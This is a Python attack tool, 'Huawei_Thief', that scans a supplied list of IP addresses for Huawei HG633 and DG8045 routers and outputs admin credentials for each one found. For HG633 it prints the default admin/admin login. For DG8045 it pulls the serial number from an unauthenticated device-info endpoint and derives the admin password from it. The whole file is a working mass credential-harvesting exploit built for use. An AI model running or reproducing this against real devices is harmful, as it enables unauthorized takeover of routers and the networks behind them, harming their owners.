# Author:    Zeyad Azima "zWIZARDz"
# Github:    https://github.com/zWIZARDz
# Facebook:  https://www.facebook.com/elkingzeyad.azeem
# Website:   https://cyberatom.org/

import requests
import json
import colored
import sys
import urllib3
from colored import stylize

logo = ("""
██╗  ██╗██╗   ██╗ █████╗ ██╗    ██╗███████╗██╗    ████████╗██╗  ██╗██╗███████╗
██║  ██║██║   ██║██╔══██╗██║    ██║██╔════╝██║    ╚══██╔══╝██║  ██║██║██╔═══╝
███████║██║   ██║███████║██║ █╗ ██║█████╗  ██║       ██║   ███████║██║█████╗  
██╔══██║██║   ██║██╔══██║██║███╗██║██╔══╝  ██║       ██║   ██╔══██║██║██╔══╝  
██║  ██║╚██████╔╝██║  ██║╚███╔███╔╝███████╗██║       ██║   ██║  ██║██║███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝       ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝
                                     By: Zeyad Azima
                               https://github.com/Cyber-Atom   
                 This tool works on DG8045 & HG633 Versions of Huawei devices
-------------------------------------------------------------------------------------------------
""")

def huawei(target_file):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        with open(target_file, 'r') as file:
            ip_list = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(stylize(f"[-] Error reading target file: {e}", colored.fg('red')))
        return

    for ip in ip_list:
        try:
            r = requests.get(f'http://{ip}', verify=False, timeout=5)
            if "HG633" in r.text:
                print(stylize(f"[+] {ip} (HG633):", colored.fg('green')))
                print(stylize("Username: admin \nPassword: admin", colored.fg('green')))
                print("-------------------------------------")
            elif "DG8045" in r.text:
                res = requests.get(f'http://{ip}/api/system/deviceinfo', verify=False, timeout=5)
                code = res.text.replace('while(1); /*', '').replace('*/', '')
                try:
                    device_info = json.loads(code)
                    serial = device_info.get('SerialNumber', '')
                    if len(serial) >= 20:
                        password = serial[12:20]
                        print(stylize(f"[+] {ip} (DG8045):", colored.fg('green')))
                        print(stylize(f"Username: admin \nPassword: {password}", colored.fg('green')))
                    else:
                        print(stylize(f"[-] {ip} SerialNumber too short.", colored.fg('red')))
                except Exception as parse_err:
                    print(stylize(f"[-] {ip} Failed to parse JSON: {parse_err}", colored.fg('red')))
                print("-------------------------------------")
            else:
                print(stylize(f"[-] {ip} is not DG8045 OR HG633 ", colored.fg('red')))
                print("-------------------------------------")
        except requests.exceptions.RequestException as req_err:
            print(stylize(f'[-] {ip} Error: {req_err}', colored.fg('red')))
            print("-------------------------------------")

print(stylize(logo, colored.fg('green')))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(stylize("""[-] Please specify target list
ex: python3 Huawei_Thief.py target.txt""", colored.fg('blue')))
        sys.exit(1)
    huawei(sys.argv[1])
